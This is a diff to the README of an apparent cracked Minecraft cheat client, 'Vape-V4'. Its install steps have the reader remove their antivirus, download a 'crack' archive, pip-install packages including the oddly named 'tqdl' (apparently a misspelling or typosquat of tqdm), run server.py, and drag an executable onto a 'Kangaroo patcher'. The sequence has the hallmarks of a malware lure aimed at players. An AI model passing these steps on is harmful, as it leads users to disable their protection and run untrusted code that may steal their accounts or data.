@@ -9,15 +9,20 @@ Ghost Client Minecraft
 
 1.Remove Your antivirus 
 
-2.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
+2.install python 3.9 or a more recent version
 
-3.Open a Cmd in the folder and put the command : pip install -r requirements.txt
+3.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
 
-4.Proceed to install [Java 17.0.6](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or a more recent version.
+4.do the following command: `pip install pandas requests websockets pyOpenSSL tqdl`</br>
 
-5.Launch Lunar client or 1.8.9 vanilla
+5.if no error occured, do : `py server.py`</br>
 
-6.Click on Vape-Loader.exe and wait till it inject
+5.Proceed to install [Java 17.0.6](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or a more recent version.
+
+6.Launch Lunar client or 1.8.9 vanilla
+
+7.keep the server opened and drag and drop Vape.exe to the other file named "Kangaroo patcher"
+
 
 # Features 🛠️
 ### Vape-V4 can do plenty of things, like:
